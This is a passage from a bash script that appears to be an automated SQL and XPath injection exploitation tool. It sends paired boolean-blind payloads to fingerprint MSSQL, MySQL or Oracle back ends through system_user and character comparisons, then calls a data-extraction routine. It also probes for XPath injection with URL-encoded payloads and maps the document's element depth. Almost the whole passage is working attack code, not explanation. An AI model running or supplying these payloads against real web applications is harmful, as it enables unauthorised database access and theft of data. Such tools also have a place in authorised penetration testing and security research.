			echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"??"$badparams";
			tput sgr0 # Reset attributes.
		fi
	elif [ "$multipartPOSTURL" == 1 ] ; then
		#multipart post
		echo "[$remessage REQ:$K] $method URL: $uhostname$page"???"$badparams" >> ./output/$safelogname$safefilename.txt
		echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"???"$badparams"
		tput sgr0 # Reset attributes.
	else
		#normal post
		echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$badparams" >> ./output/$safelogname$safefilename.txt
		echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		tput sgr0 # Reset attributes.
	fi
fi
}

dbtypecheck()
{
# try to figure out the backend db using conditional tests:

#beginning of dbms enumeration if statement:
if [[ "$dbms" != "" ]] ; then
	echo "DBMS already specified as $dbms"
else
	echo "Running conditional tests to determine DB type"
fi
#mssqlcheck - only works on numeric params
badparams=`echo "$cleanoutput" | replace "$payload" "1/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug sending $request"
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$payload" "1/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug sending $request"
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is MSSQL"
	echoreporter
	dbms="mssql"
	numerator="1 or 789=789"
	#lettergrab
fi
if [[ "$status_true" == "$status_false" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		remessage="LENGTH DIFF EQUALS $lendiff DB is MSSQL"
		echoreporter
		dbms="mssql"
		numerator="1 or 789=789"
 		#lettergrab
	fi
fi

#mssqlcheck - only works on string params
badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789=789/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug true $request"
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789=789/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug false $request"
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is MSSQL"
	echoreporter
	dbms="mssql"
	numerator="a' or 789=789"
	#lettergrab
fi
if [[ "$status_true" == "$status_false" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		remessage="LENGTH DIFF EQUALS $lendiff DB is MSSQL"
		echoreporter
		dbms="mssql"
		numerator="a' or 789=789"
 		#lettergrab
	fi
fi

#mssqlcheck DOUBLE QUOTE- only works on string params
badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789=789/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug true $request"
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789=789/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug false $request"
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is MSSQL"
	echoreporter
	dbms="mssql"
	numerator="a\" or 789=789"
	#lettergrab
fi
if [[ "$status_true" == "$status_false" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		remessage="LENGTH DIFF EQUALS $lendiff DB is MSSQL"
		echoreporter
		dbms="mssql"
		numerator="a\" or 789=789"
 		#lettergrab
	fi
fi

#mysqlcheck - only works on numeric params
badparams=`echo "$cleanoutput" | replace "$payload" "1/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug true $request"
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$payload" "1/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug false $request"
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is MYSQL"
	echoreporter
	dbms="mysql"
	numerator="789=789"
	#lettergrab
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		#tput sgr0 # Reset attributes.
		remessage="LENGTH DIFF EQUALS $lendiff DB is MYSQL"
		echoreporter
		dbms="mysql"
		numerator="789=789"
 		#lettergrab
	fi
fi

#mysqlcheck - only works on string params
badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789=789/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789=789/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is MYSQL"
	echoreporter
	numerator="1' or 789"
	dbms="mysql"
 	#lettergrab
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		#tput sgr0 # Reset attributes.
		remessage="LENGTH DIFF EQUALS $lendiff DB is MYSQL"
		echoreporter
		dbms="mysql"
		numerator="1' or 789"
 		#lettergrab
	fi
fi

#mysqlcheck DOUBLE QUOTE- only works on string params
badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789=789/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789=789/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is MYSQL"
	echoreporter
	numerator="1\" or 789"
	dbms="mysql"
 	#lettergrab
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		#tput sgr0 # Reset attributes.
		remessage="LENGTH DIFF EQUALS $lendiff DB is MYSQL"
		echoreporter
		dbms="mysql"
		numerator="1\" or 789"
 		#lettergrab
	fi
fi

#oraclecheck - only works on numeric params
badparams=`echo "$cleanoutput" | replace "$payload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 0) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$payload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 255) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" 
	dbms="oracle"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is ORACLE"
	echoreporter
	numerator="1 or 789"
	#lettergrab
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		#tput sgr0 # Reset attributes.
		dbms="oracle"
		remessage="LENGTH DIFF EQUALS $lendiff DB is ORACLE"
		echoreporter
		numerator="1 or 789"
		#lettergrab
	fi
fi

#oraclecheck - only works on string params
badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789/(case when (ascii(substr((select user from dual),1,1)) > 0) then 789 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789/(case when (ascii(substr((select user from dual),1,1)) > 255) then 789 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" 
	dbms="oracle"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is ORACLE"
	numerator="1' or 789"
	echoreporter
	#lettergrab
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		#tput sgr0 # Reset attributes.
		dbms="oracle"
		remessage="LENGTH DIFF EQUALS $lendiff DB is ORACLE"
		numerator="1' or 789"
		echoreporter
		#lettergrab
	fi
fi

#oraclecheck DOUBLE QUOTE - only works on string params
badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789/(case when (ascii(substr((select user from dual),1,1)) > 0) then 789 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789/(case when (ascii(substr((select user from dual),1,1)) > 255) then 789 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" 
	dbms="oracle"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is ORACLE"
	numerator="1\" or 789"
	echoreporter
	#lettergrab
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		#tput sgr0 # Reset attributes.
		dbms="oracle"
		remessage="LENGTH DIFF EQUALS $lendiff DB is ORACLE"
		numerator="1\" or 789"
		echoreporter
		#lettergrab
	fi
fi

#end of dbms enumeraton if statement

#i had a problem when doing fully blind delay based exploitation: i know the dbms (from the delay payload), but i dont know the numerator [effectively whether injection requires a quote or not]. so, the code below checks to see if we have a value for numerator, if not, we set it to 1. we also set the guessednumeratorflag=1 which causes a second run with a numerator of 1'
guessednumeratorflag=0
if [[ "$numerator" == "" ]] ; then
	echo "Trying integer-based injection - no single quote"
	if [[ $dbms == "mssql" ]] ; then
		numerator="1 or 789=789"
	elif [[ $dbms == "mysql" ]] ; then
		numerator="789=789"
	elif [[ $dbms == "oracle" ]] ; then
		numerator="1 or 789=789"
	fi
	guessednumeratorflag=1
fi

if [ true = "$Z" ] ; then echo "DEBUG! dbms: $dbms numerator: $numerator" ; fi 
if [ true = "$Z" ] ; then echo "Calling lettergrab" ; fi 

#this line below calls the lettergrab data extraction routine that first tries status/length diffing and then tries delay diffing to perform data extraction:
lettergrab

#this code re-runs lettergrab with a string based numerator if we guessed the numerator:
if [[ "$guessednumeratorflag" == "1" ]] ; then
	echo "Trying string-based injection - using a single quote"
	if [[ $dbms == "mssql" ]] ; then
		numerator="a' or 789=789"
	elif [[ $dbms == "mysql" ]] ; then
		numerator="1' or 789"
	elif [[ $dbms == "oracle" ]] ; then
		numerator="1' or 789=789"
	fi
	lettergrab
fi

if [[ "$dbms" == "" ]] ; then
	#if we get here then nothing worked - lets have a shot at XPath data extraction instead:
	echo "Could not determine DBMS using SQL injection"
fi

if [[ "$extract" == "0" ]] ; then
	#if we get here then nothing worked - lets have a shot at XPath data extraction instead:
	echo "Could not extract data using SQL injection"
fi

############# begining of XPath injection data extraction section ################
echo "Testing for XPath injection"	

xp=''
#xpathcheck - numeric params			    #1 or count(parent::*[position()=1])>0
badparams=`echo "$cleanoutput" | replace "$payload" "%31%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3e%30"`

requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`      #1 or count(parent::*[position()=1])=0
badparams=`echo "$cleanoutput" | replace "$payload" "%31%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3d%30"`

requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`

((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	remessage="STATUS DIFF T:$status_true F:$status_false XPATH Numeric Injection"
	echoreporter
	xp="numeric"
	xpathtests
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 0 || $lendiff -lt 0 ]] ; then			
		remessage="LENGTH DIFF EQUALS $lendiff XPATH Numeric Injection"
		echoreporter
		xp="numeric"
		xpathtests
	fi
fi

xp=''
#xpathcheck - string params

#always true:                                       #' or count(parent::*[position()=1])>0 or 'a'='b
badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3e%30%20%6f%72%20%27%61%27%3d%27%62"`

requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`

#always false:                                      #' or count(parent::*[position()=1])=0 or 'a'='b
badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3d%30%20%6f%72%20%27%61%27%3d%27%62"`

requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`

((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	remessage="XPATH String Injection STATUS DIFF T:$status_true F:$status_false"
	echoreporter
	xp="string"
	xpathnodenumberextract
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 0 || $lendiff -lt 0 ]] ; then			
		remessage="XPATH String Injection LENGTH DIFF EQUALS $lendiff"
		echoreporter
		xp="string"
		xpathnodenumberextract
	fi
fi
#xpathcheck - conditional string

#always true:                                       #345'] or count(/*)>0 or /a['a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3e%30%20%6f%72%20%2f%61%5b%27%61"`

requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`

#always false:                                      #345'] or count(/*)=0 or /a['a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3d%30%20%6f%72%20%2f%61%5b%27%61"`

requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`

((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	remessage="XPATH Conditional String Injection STATUS DIFF T:$status_true F:$status_false"
	echoreporter
	xp="conditionalstring"
	xpathnodenumberextract
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 0 || $lendiff -lt 0 ]] ; then			
		remessage="XPATH Conditional String Injection LENGTH DIFF EQUALS $lendiff"
		echoreporter
		xp="conditionalstring"
		xpathnodenumberextract
	fi
fi

#xpathcheck - dual conditional string

#always true:                                       #345')] or count(/*)>0 or /a[contains(a,'a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%29%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3e%30%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%27%61"`

requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`

#always false:                                      #345')] or count(/*)=0 or /a[contains(a,'a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%29%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3d%30%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%27%61"`

requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`

((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	remessage="XPATH Dual Condition String Injection STATUS DIFF T:$status_true F:$status_false"
	echoreporter
	xp="dualconditionalstring"
	xpathnodenumberextract
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 0 || $lendiff -lt 0 ]] ; then			
		remessage="XPATH Dual Condition String Injection LENGTH DIFF EQUALS $lendiff"
		echoreporter
		xp="dualconditionalstring"
		xpathnodenumberextract
	fi
fi
#xpathcheck - conditional numeric

#always true:                                       #345] or count(/*)>0 or /a[a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3e%30%20%6f%72%20%2f%61%5b%61"`

requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`

#always false:                                      #345] or count(/*)=0 or /a[a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3d%30%20%6f%72%20%2f%61%5b%61"`

requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
#echo "length_true: $length_true length_false: $length_false"

((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	remessage="XPATH Conditional Numeric Injection STATUS DIFF T:$status_true F:$status_false"
	echoreporter
	xp="conditionalnumeric"
	xpathnodenumberextract
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 0 || $lendiff -lt 0 ]] ; then			
		remessage="XPATH Conditional Numeric Injection LENGTH DIFF EQUALS $lendiff"
		echoreporter
		xp="conditionalnumeric"
		xpathnodenumberextract
	fi
fi

#xpathcheck - dual conditional numeric

#always true:                                       #345)] or count(/*)>0 or /a[contains(a,a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%29%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3e%30%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%61"`

requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`

#always false:                                      #345)] or count(/*)=0 or /a[contains(a,a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%29%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3d%30%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%61"`

requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`

((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	remessage="XPATH Dual Condition Numeric Injection STATUS DIFF T:$status_true F:$status_false"
	echoreporter
	xp="dualconditionalnumeric"
	xpathnodenumberextract
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 0 || $lendiff -lt 0 ]] ; then			
		remessage="XPATH Dual Condition Numeric Injection LENGTH DIFF EQUALS $lendiff"
		echoreporter
		xp="dualconditionalnumeric"
		xpathnodenumberextract
	fi
fi
#xpathcheck - dualconditionalstringnotboolean

#always true:                                       #345')]|//*|/a[contains(a,'a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%29%5d%7c%2f%2f%2a%7c%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%27%61"`

requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`

#always false:                                      #345')]|//a|/a[contains(a,'a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%29%5d%7c%2f%2f%61%7c%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%27%61"`

requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`

((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	remessage="XPATH Dual Condition String Injection (No Boolean Response) STATUS DIFF T:$status_true F:$status_false"
	echoreporter
	xp="dualconditionalstringnotboolean"
	xpathnodenumberextract
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 0 || $lendiff -lt 0 ]] ; then			
		remessage="XPATH Dual Condition String Injection (No Boolean Response) LENGTH DIFF EQUALS $lendiff"
		echoreporter
		xp="dualconditionalstringboolean"
		xpathnodenumberextract
	fi
fi
#xpathcheck - dualconditionalnumericnotboolean

#always true:                                       #345)]|//*|/a[contains(a,a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%29%5d%7c%2f%2f%2a%7c%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%61"`

requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`

#always false:                                      #345)]|//a|/a[contains(a,a
badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%29%5d%7c%2f%2f%61%7c%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%61"`

requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`

((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	remessage="XPATH Dual Condition Numeric Injection (No Boolean Response) STATUS DIFF T:$status_true F:$status_false"
	echoreporter
	xp="dualconditionalnumericnotboolean"
	xpathnodenumberextract
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 0 || $lendiff -lt 0 ]] ; then			
		remessage="XPATH Dual Condition Numeric Injection (No Boolean Response) LENGTH DIFF EQUALS $lendiff"
		echoreporter
		xp="dualconditionalnumericnotboolean"
		xpathnodenumberextract
	fi
fi
}


xpathnodenumberextract()
{
#store the length diff value from the detection test that just happened; we will compare our exploitation results with this stored lendiff value
storedlendiff=$lendiff

#setup payloads for numeric or string params
if [[ "$xp" == "numeric" ]] ; then
	echo "numeric"
	      #1
	begin="%30"
	end=''
elif [[ "$xp" == "string" ]] ; then
	echo "string"
	      #'
	begin="%27"
	    # or 'e'='r
	end="%20%6f%72%20%27%65%27%3d%27%72"
elif [[ "$xp" == "conditionalstring" ]] ; then
	echo "conditionalstring"
	      #345']
	begin="%33%34%35%27%5d"
	    # or /a['a
	end="%20%6f%72%20%2f%61%5b%27%61"
elif [[ "$xp" == "dualconditionalstring" ]] ; then
	echo "dualconditionalstring"
	      #345')]
	begin="%33%34%35%27%29%5d"
	    # or /a[contains(a,'b
	end="%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%27%62"
elif [[ "$xp" == "conditionalnumeric" ]] ; then
	echo "conditionalnumeric"
	begin="%33%34%35%5d"
	end="%20%6f%72%20%2f%61%5b%61"
elif [[ "$xp" == "dualconditionalnumeric" ]] ; then
	echo "dualconditionalnumeric"
	begin="%33%34%35%29%5d"
	end="%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%62"
fi


rm ./listofxpathelements.txt 2>/dev/null
echo "Attempting to extract element hierachy using xpath injection."
max_nodenumber=10
obuff="%2f%2a%5b%31%5d"
ecount=1
fcount=0

while [[ $ecount -lt $max_nodenumber ]] ; do 
	#always false:                                            #count(/*[1])=0
	badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20or%20%63%6f%75%6e%74%28$obuff%29%3d0$end"`
	requester
	status_false=`echo $response | cut -d ":" -f 1`
	length_false=`echo $response | cut -d ":" -f 2`
                                                                         #count(/*[1])=1
	badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20or%20%63%6f%75%6e%74%28$obuff%29%3d1$end"`
	requester
	status_true=`echo $response | cut -d ":" -f 1`
	length_true=`echo $response | cut -d ":" -f 2`
	((lendiff=$length_true-$length_false))
	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
		obuff=$obuff"%2f%2a%5b%31%5d"
		((fcount=$fcount+1))
	fi
	if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
		if [[ $lendiff == $storedlendiff ]] ; then			
			obuff=$obuff"%2f%2a%5b%31%5d"
		        ((fcount=$fcount+1))
		fi
	fi
	((ecount=$ecount+1))
done
echo ""
echo "Total element depth: $fcount"
#cat ./listofxpathnodes.txt


###beginning of enumeration if statement
if [[ "$elementreuse" == "1" ]] ; then
